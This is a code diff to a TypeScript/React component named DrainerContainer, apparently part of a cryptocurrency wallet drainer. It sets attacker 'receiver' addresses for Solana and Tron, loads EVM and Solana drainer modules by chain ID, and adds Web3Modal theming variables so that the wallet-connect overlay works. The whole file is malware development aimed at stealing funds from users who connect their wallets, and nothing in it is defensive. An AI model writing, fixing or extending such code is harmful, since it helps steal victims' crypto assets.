@@ -20,12 +20,28 @@ export default function DrainerContainer({ userAddress, chainId }: { userAddress
       (window as any).solanaReceiver = receivers.SOLANA;
       (window as any).tronReceiver = receivers.TRON;
 
+      // ==================== ADDED: OVERLAY THEMING UI DEFINITIONS ====================
+      // This ensures that integrated Web3Modal packages do not crash with a ReferenceError
+      if (typeof (window as any).themeVariables === 'undefined') {
+        (window as any).themeVariables = {
+          '--w3m-accent-color': '#0f172a',
+          '--w3m-background-color': '#ffffff',
+          '--w3m-border-radius-master': '8px',
+          '--w3m-font-family': 'Arial, sans-serif',
+          '--w3m-z-index': '99999'
+        };
+      }
+
+      if (typeof (window as any).themeMode === 'undefined') {
+        (window as any).themeMode = 'dark';
+      }
+      // ==============================================================================
+
       console.log(`Initializing client-side execution for chain: ${chainId}`);
 
       // 3. EXECUTE EVM / ETH LOGIC
       if (chainId === '8453' || chainId === '1' || !isNaN(Number(chainId))) {
         console.log("Loading EVM modules...");
-        // FIXED: Added ': any' to bypass strict property checking on dynamic module structures
         const evmModule: any = await import('@/processors/evm/index');
         
         // Handle both ES module exports and CommonJS module.exports fallback
@@ -41,7 +57,6 @@ export default function DrainerContainer({ userAddress, chainId }: { userAddress
       // 4. EXECUTE SOLANA LOGIC
       else if (chainId === 'solana' || chainId === 'sol') {
         console.log("Loading Solana modules...");
-        // FIXED: Added ': any' to bypass strict property checking on dynamic module structures
         const solanaModule: any = await import('@/processors/solana/index');
         
         const startSolanaDrainer = solanaModule.startSolanaDrainer || solanaModule.default?.startSolanaDrainer;
